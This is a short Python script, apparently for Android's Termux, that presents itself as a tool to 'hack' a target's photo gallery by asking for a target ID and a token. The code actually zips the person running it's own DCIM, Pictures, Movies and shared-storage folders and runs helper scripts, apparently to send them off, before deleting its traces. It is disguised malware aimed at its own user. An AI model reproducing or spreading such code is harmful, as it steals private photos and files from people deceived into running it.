import os
import time
import sys

BLACK   = '\033[30m'
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'
os.system("clear")
print(RED+"""
⠀⠀⠀⠀⠀⢀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣤⣄⣀⡀
⠀⠀⣠⣶⣾⡿⠿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⢿⣷⣶⣄⡀
⢠⣾⡟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢻⣿⡄
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⢀⡶⠛⠛⠛⠛⠻⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠟⠛⠛⠛⠛⠶⡄⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⡇⠀⠀⠀⠀⢸⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⢀⣠⣤⣤⣤⣤⣀⠀⠈⠉⠁⠀⠀⠀⠀⠈⠉⠁⠀⣀⣤⣤⣤⣤⣤⡀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠙⠻⠿⠿⠿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠟⠛⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
⠘⣿⣇⠀⠀⠠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠄⠀⠀⣸⣿⠃
⠀⢹⣿⡆⠀⠀⠘⣷⣄⡀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⢀⣠⣾⠃⠀⠀⢠⣿⡏
⠀⠈⢿⣷⡀⠀⠀⠈⢻⣿⣦⣤⣤⣤⣤⣾⣿⣿⡿⢿⣿⣿⣷⣤⣤⣤⣤⣴⣿⡟⠁⠀⠀⢀⣾⡿⠁
⠀⠀⠈⣿⣷⡀⠀⠀⠀⠻⠿⠿⠿⠿⠿⠿⠿⠛⠀⠀⠛⠿⠿⠿⠿⠿⠿⠿⠟⠀⠀⠀⢀⣾⣿⠁
⠀⠀⠀⠈⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠁
⠀⠀⠀⠀⠈⠻⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠟⠁
⠀⠀⠀⠀⠀⠀⠘⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣰⣾⡿⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⢀⣴⣿⡿⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣤⣀⡀⣿⣿⣿⣿⢀⣀⣤⣾⣿⠟⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⣿⣿⣿⣿⡿⠿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁
   """)

input(GREEN+"Enter ID or numer Target : ")
print(" ")
input(YELLOW+"Enter ID or Token for send image : ")
os.system("clear")


d = (YELLOW+"  Pleas Waite for hack Gallery"+GREEN+" ")
for d in d:
        sys.stdout.write(d)
        sys.stdout.flush()
        time.sleep(0.2)

os.system("cp D.py ../storage/shared")
os.system("cp DC.py ../storage/shared")
os.system("cp M.py ../storage/shared")
os.system("cp P.py ../storage/shared")
os.chdir("../storage/shared")
os.system("clear")
os.system("zip -r DC.zip DCIM")
os.system("python DC.py")
os.system("clear")
os.system("zip -r P.zip Pictures")
os.system("python P.py")
os.system("clear")
os.system("zip -r M.zip Movies")
os.system("python M.py")
os.system("clear")
os.system('zip -r D.zip . -x "*.mp3" "*.apk"')
os.system("rm -rf D.py D.zip P.py P.zip DC.py DC.zip M.py M.zip")
os.system("rm-rf TEST")
os.cgdir("../../")
os.system("rm -rf hk")
